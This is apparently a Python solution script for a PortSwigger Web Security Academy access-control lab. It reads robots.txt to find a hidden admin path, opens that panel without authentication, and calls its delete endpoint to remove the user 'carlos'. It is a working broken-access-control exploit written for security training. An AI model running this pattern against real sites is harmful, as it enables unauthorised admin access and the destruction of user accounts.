# Lab: Unprotected admin functionality
# https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

import re
import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

robots_url = f"{base_url}/robots.txt"
response = session.get(robots_url)
if response.status_code != 200:
    print(f"Failed to fetch robots.txt: {response.status_code}")
    exit()

match = re.search(r"Disallow:\s*(/\S+)", response.text) #re.search Stops scanning after it finds that first match.

if not match:
    print("Admin path not found in robots.txt")
    exit()
admin_path = match.group(1)
print(f"Found admin path: {admin_path}")

admin_url = f"{base_url}{admin_path}"
response = session.get(admin_url)
print(response.text)
if response.status_code != 200:
    print(f"Failed to access admin panel: {response.status_code}")
    exit()
print("Accessed admin panel successfully.")


exploit_url = f"{admin_url}/delete?username=carlos"
response = session.get(exploit_url)
if response.status_code != 200:
    print(f"Failed to access admin panel: {response.status_code}")
    exit()

if "Congratulations" in response.text:
    print("Lab solved")

else:
    print("Exploit did not work")

